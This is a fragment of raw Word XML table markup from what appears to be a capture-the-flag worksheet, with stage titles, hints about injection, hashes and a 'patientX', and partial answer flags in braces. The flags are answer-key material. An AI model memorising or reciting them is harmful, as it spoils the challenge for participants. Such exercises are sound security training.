              <w:t>ie s</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ri</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="-6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252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="-3"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>gg</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>er?</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="4"/>
                <w:position w:val="-6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252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>--&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:spacing w:line="180" w:lineRule="exact"/>
              <w:ind w:left="3334" w:right="4625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252525"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="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252525"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>inject</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>n</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="3374" w:right="4663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252525"/>
                <w:spacing w:val="-1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color w:val="252525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les</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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252525"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>;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-)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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-</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-3"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>-</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>nn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ie.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CF78E9">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="1527"/>
        </w:trPr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B58A80"/>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:spacing w:before="93"/>
              <w:ind w:left="203" w:right="214" w:firstLine="1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color w:val="252525"/>
                <w:spacing w:val="-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ag</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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 xml:space="preserve">– </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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color w:val="252525"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color w:val="252525"/>
                <w:spacing w:val="2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-</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1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 xml:space="preserve">e </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1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ast a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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d Break Thi</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ng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s</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="975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FE7E4"/>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:line="200" w:lineRule="exact"/>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:before="16" w:line="280" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:spacing w:line="340" w:lineRule="exact"/>
              <w:ind w:left="11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252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>{</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>_</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ki</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ng</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>_</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>etai</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>_f</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="-3"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>nd</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">}      </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="37"/>
                <w:position w:val="-6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252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>atien</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>X</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="7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252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>is</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="7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252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>hi</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve"> m</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">re          </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="47"/>
                <w:position w:val="7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252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ey</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="7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252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>nn</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ie, ple</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-3"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>se</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="7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252525"/>
                <w:spacing w:val="-3"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>’t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve"> o</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>er</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>w</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>rite</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="7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252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>th</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>s</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:spacing w:line="180" w:lineRule="exact"/>
              <w:ind w:left="334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252525"/>
                <w:position w:val="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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>an</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="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252525"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>bone f</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:spacing w:val="-3"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ct</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">res                                </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="3"/>
                <w:position w:val="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252525"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>fol</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>er a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>in</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="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252525"/>
                <w:spacing w:val="-3"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>—</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>o</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CF78E9">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="1399"/>
        </w:trPr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B58A80"/>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:before="3" w:line="160" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="138" w:right="152" w:firstLine="3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color w:val="252525"/>
                <w:spacing w:val="-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ag</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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3</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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 xml:space="preserve">– </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing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ixel</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-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 xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing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ac</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>k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color w:val="252525"/>
                <w:spacing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color w:val="252525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 xml:space="preserve">&amp; </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing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atient</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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X</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5550" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="E0D0CC"/>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:before="3" w:line="160" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="3454" w:right="535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252525"/>
                <w:spacing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ean</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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a’s hash</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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is</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:spacing w:line="340" w:lineRule="exact"/>
              <w:ind w:left="59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252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>{xray</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="-3"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>_</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>_fra</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ud</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">}               </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="32"/>
                <w:position w:val="-6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252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>stu</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>bb</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
